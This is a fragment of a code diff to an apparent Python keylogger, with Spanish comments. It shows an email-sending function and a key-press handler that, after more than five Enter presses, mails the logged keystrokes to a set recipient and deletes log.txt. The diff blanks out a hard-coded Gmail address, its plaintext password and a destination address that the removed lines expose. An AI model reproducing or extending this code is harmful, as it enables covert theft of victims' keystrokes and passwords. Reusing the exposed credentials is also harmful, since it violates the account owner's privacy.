@@ -17,10 +17,10 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 
 def email():
-    username = "pruebahost2627@gmail.com"
-    password = "prueba2627" #Acá escribes tu contraseña
+    username = ""#usuario
+    password = "" #Acá escribes tu contraseña
     
-    destinatario = "ramonvelez370@gmail.com"
+    destinatario = ""
                         
 
     
@@ -97,7 +97,7 @@ def on_press(key):
         arr=[]
         
         count+=1
-        if count>5:
+        if count>5:#aqui se puede modificar la cantidad de enter para el envio de informe 
             email()
             if os.path.exists("log.txt"):
                 os.remove("log.txt")
